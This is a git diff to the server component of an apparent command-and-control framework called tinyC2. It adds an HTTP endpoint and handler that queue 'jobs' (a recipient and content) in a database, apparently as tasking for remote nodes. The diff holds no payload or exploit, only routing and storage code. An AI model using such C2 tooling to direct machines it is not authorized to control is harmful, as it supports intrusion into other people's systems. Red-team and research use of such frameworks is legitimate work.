@@ -11,13 +11,13 @@ import (
 
 	"github.com/go-chi/chi/v5"
 	"github.com/patbcole117/tinyC2/node"
+    "github.com/patbcole117/tinyC2/comms"
 )
 
 var (
     db	                    dbManager   = NewDBManager()
     url                     string      = "127.0.0.1:8000"
     d                       Dispatcher  = NewDispatcher()
-    BEACON_CHANNEL_LIMIT    int         = 10
 )
 
 func Run() {
@@ -25,6 +25,7 @@ func Run() {
     r.Get("/",                   Check)
     r.Get("/v1/l/",              GetNodes)
     r.Get("/v1/l/new/",          NewNode)
+    r.Post("/v1/j/new/",          NewJob)
     r.Get("/v1/l/{id}/",         GetNode)
     r.Post("/v1/l/{id}/",        UpdateNode)
     r.Get("/v1/l/{id}/start/",   StartNode)
@@ -77,6 +78,41 @@ func DeleteNode(w http.ResponseWriter, r *http.Request) {
     _, bmsg := FgoodMsg(fmt.Sprintf("deleted %d", id))
     w.Write(bmsg)
 }
+
+func NewJob (w http.ResponseWriter, r *http.Request) {
+    LogRequest(r)
+    body, err := io.ReadAll(r.Body)
+    if err != nil {
+        w.WriteHeader(http.StatusBadRequest)
+        _, bmsg := FbadMsg("NewJob->io.ReadAll->"+err.Error())
+        w.Write(bmsg)
+        return
+    }
+    
+    var b map[string]string
+    if err = json.Unmarshal(body, &b); err != nil {
+        w.WriteHeader(http.StatusBadRequest)
+        _, bmsg := FbadMsg("NewJob->json.Marshal->"+err.Error())
+        w.Write(bmsg)
+        return
+    }
+
+    j := comms.NewJob(b["to"], b["content"])
+
+    res, err := db.InsertMsg(j)
+    if err != nil {
+        w.WriteHeader(http.StatusBadRequest)
+        _, bmsg := FbadMsg("NewJob->db.InsertMsg->"+err.Error())
+        w.Write(bmsg)
+        return
+    }
+
+    w.WriteHeader(http.StatusCreated)
+    _, bmsg := FgoodMsg(fmt.Sprintf("inserted %s", res.InsertedID))
+    w.Write(bmsg)
+}
+
+
 
 func NewNode (w http.ResponseWriter, r *http.Request) {
     LogRequest(r)
